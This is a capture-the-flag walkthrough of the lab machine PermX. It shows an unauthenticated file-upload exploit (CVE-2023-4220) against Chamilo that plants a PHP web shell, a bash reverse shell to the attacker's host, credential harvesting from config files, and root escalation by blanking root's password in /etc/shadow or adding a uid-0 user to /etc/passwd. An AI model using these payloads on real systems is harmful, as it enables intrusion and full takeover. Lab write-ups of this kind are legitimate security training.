

![1](</Writeups/Machines/Permx/img/logo.png>)
By Rug4lo

## Reconnaissance

First of all, let's start with the reconnaissance of the machine:

We'll scan its ports with Nmap:

```bash
❯ nmap -sCV -p22,80 -oN Targeted 10.10.11.23

Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  6 21:05:13 2024 -- 1 IP address (1 host up) scanned in 8.41 seconds
```
We can see there are only 2 ports open, and looking at the versions they don't seem vulnerable, so let's inspect the website on port 80

We can run a Whatweb and a gobuster and we'll see that they don't report anything, but if we scan for subdomains we'll find a very interesting one
```bash
❯ wfuzz -c --hc=403,400 --hw=26 -t 20 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.permx.htb" http://permx.htb

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://permx.htb/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000001:   200        586 L    2466 W     36182 Ch    "www"                                                                                                                  
000000477:   200        352 L    940 W      19347 Ch    "lms"
```

That lms.permx.htb is very interesting, so we'll add it to /etc/hosts and go take a look at what's there

We can see this subdomain has a login, and it looks like a Chamilo instance

![1](</Writeups/Machines/Permx/img/1.png>)

We can try several typical credentials such as admin:admin but they won't work, so we can start looking for a CVE for Chamilo, ideally an unauthenticated one

## Unauthenticated Upload File - Remote Code Execution

After searching I found CVE-2023-4220, which allows uploading files without authentication

CVE --> https://starlabs.sg/advisories/23/23-4220/

Following the steps of this CVE, I first create the malicious PHP file
```bash
❯ echo '<?php system($_GET["cmd"]); ?>' > rce.php
```
We upload the file to the victim machine 
```bash
❯ curl -F 'bigUploadFile=@rce.php' 'http://<chamilo>/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'

The file has successfully been uploaded.%
```
And we browse to it to run the command (in this case an id)
```bash
❯ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=id'

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Now that we've confirmed we have command execution we can launch the reverse shell (first setting up a netcat listener with `nc -nlvp 4444`
```bash
❯ curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.21/4444%200%3E%261%22'
```
## From www-data to mtz

Great, we have the reverse shell, but we still can't get the user flag, so since we see that the user we need to pivot to is called mtz, let's try to look for credentials for him in some configuration file

We see that in /var/www/chamilo there is an /app directory and inside it a /config one. In these configuration files it's very common to find hardcoded user or database credentials, so let's go into that directory and grep for the word pass
```bash
❯ cat * | grep "pass"
```
![1](</Writeups/Machines/Permx/img/2.png>)


We have the database password, but in environments like these passwords are often reused, so it's worth checking whether it is also the password of the user mtz

![1](</Writeups/Machines/Permx/img/3.png>)


It is indeed the user's password, and we can now read the user flag

## Privilege escalation

We can start enumerating to escalate privileges; first let's check whether we have any sudo permissions assigned
```bash
❯ sudo -l

Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```
We see that we can run the /opt/acl.sh script as root, alright, let's see what it contains!

If we cat it we'll see the contents of this file, which breaks down into several parts
- First it checks that you passed 3 arguments and defines the variables with that information
- Then it checks that the specified path is inside mtz's home directory
- The last check makes sure that it is a file and not a directory
- Finally, once the checks are done, it uses the setfacl command to grant the specified permissions on the file in question
```bash
❯ cat /opt/acl.sh

#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```
With that understood we can move on to exploiting it. If we look up information about setfacl we'll see that it can't change a file's owner, nor can it set SUID permissions, so we can forget about tampering with the bash binary, but it does change the rest of the permissions. So we can try creating a symbolic link in mtz's home directory (so that the script runs) pointing to the file we want to read or modify, and then grant ourselves permissions on it and be able to read or modify it

Step by step it would be: create the symbolic link to the file we want to modify (in this case /etc/ because that's where shadow and passwd live)
```bash
❯ ln -s '/etc/' link
```
With the symbolic link in place we can now change the permissions of whatever file we want; in this case I'm going to change them on etc/shadow
```bash
❯ sudo /opt/acl.sh mtz rwx /home/mtz/link/shadow
```
With this we can access etc shadow and remove root's password  (this is how the file will look)
```bash
❯ cat /etc/shadow

root::19742:0:99999:7:::
daemon:*:19579:0:99999:7:::
bin:*:19579:0:99999:7:::
sys:*:19579:0:99999:7:::
sync:*:19579:0:99999:7:::
games:*:19579:0:99999:7:::
man:*:19579:0:99999:7:::
lp:*:19579:0:99999:7:::
mail:*:19579:0:99999:7:::
news:*:19579:0:99999:7:::
uucp:*:19579:0:99999:7:::
proxy:*:19579:0:99999:7:::
www-data:*:19579:0:99999:7:::
backup:*:19579:0:99999:7:::
list:*:19579:0:99999:7:::
irc:*:19579:0:99999:7:::
gnats:*:19579:0:99999:7:::
nobody:*:19579:0:99999:7:::
_apt:*:19579:0:99999:7:::
systemd-network:*:19579:0:99999:7:::
systemd-resolve:*:19579:0:99999:7:::
messagebus:*:19579:0:99999:7:::
systemd-timesync:*:19579:0:99999:7:::
pollinate:*:19579:0:99999:7:::
sshd:*:19579:0:99999:7:::
syslog:*:19579:0:99999:7:::
uuidd:*:19579:0:99999:7:::
tcpdump:*:19579:0:99999:7:::
tss:*:19579:0:99999:7:::
landscape:*:19579:0:99999:7:::
fwupd-refresh:*:19579:0:99999:7:::
usbmux:*:19742:0:99999:7:::
mtz:$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB:19742:0:99999:7:::
lxd:!:19742::::::
mysql:!:19742:0:99999:7:::
```
Now that root has no password we can run su root, we'll become root without having to enter a password and we'll be able to read the root flag

## Alternative root

Another method, without touching /etc/shadow, would be to add a user to /etc/passwd

To do this we can do the same as before and grant permissions on a file, but this time on /etc/passwd
```bash
❯ sudo /opt/acl.sh mtz rwx /home/mtz/f/etc/passwd
```
Once it has the permissions we'll be able to append a new line to the file, creating a user with root privileges and whatever password we want 
-  The `Fdzt.eqJQ4s0g` is the hashed password; in plaintext it is `w00t`
```bash
❯ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```
Now we simply authenticate as root2 and enter the password we created
```bash
❯ su root2
```